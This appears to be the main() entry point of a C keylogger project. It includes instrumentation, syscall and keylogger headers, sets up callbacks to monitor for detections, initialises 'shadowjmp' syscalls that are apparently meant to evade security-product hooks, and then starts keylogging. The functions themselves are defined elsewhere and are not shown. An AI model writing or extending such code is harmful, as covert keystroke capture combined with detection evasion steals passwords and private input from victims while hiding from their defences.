#include "instrumentation.h"
#include "syscalls.h"
#include "keylogger.h"

int main() {
    // init instrumentation callbacks
    // (used to monitor for detections)
    init_callbacks();

    // init shadowjmp syscalls
    init_syscalls();

    // start keylogging
    do_keylogger();

    return 0;
}
